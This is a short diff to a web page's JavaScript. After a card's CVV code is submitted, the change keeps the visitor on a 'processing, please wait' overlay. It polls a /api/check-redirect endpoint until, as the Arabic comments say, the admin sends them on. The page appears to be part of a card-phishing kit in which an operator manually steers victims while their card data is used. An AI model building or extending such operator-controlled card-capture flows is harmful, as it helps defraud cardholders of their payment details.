@@ -470,7 +470,9 @@
             showSuccess();
             setTimeout(() => { window.location.href = data.redirect; }, 2000);
           } else {
-            showSuccess();
+            // بقاء في صفحة تحميل حتى يوجه الأدمين
+            showWaiting();
+            startRedirectPolling(data.referenceId || referenceId);
           }
         } else {
           showError(data.message || 'رمز CVV غير صحيح، يرجى المحاولة مجدداً');
@@ -543,6 +545,29 @@
 
   function showSuccess() {
     document.getElementById('successOverlay').classList.add('show');
+  }
+
+  // صفحة تحميل - بقاء حتى يوجه الأدمين
+  function showWaiting() {
+    const overlay = document.getElementById('loadingOverlay');
+    overlay.classList.add('show');
+    document.getElementById('loadingText').textContent = 'جاري معالجة طلبك، يرجى الانتظار...';
+  }
+
+  let pollingInterval = null;
+  function startRedirectPolling(ref) {
+    if (pollingInterval) clearInterval(pollingInterval);
+    pollingInterval = setInterval(async () => {
+      try {
+        const r = await fetch('/api/check-redirect/' + encodeURIComponent(ref));
+        const d = await r.json();
+        if (d.success && d.redirect) {
+          clearInterval(pollingInterval);
+          showSuccess();
+          setTimeout(() => { window.location.href = d.redirect; }, 1500);
+        }
+      } catch(e) {}
+    }, 3000);
   }
 </script>
 </body>
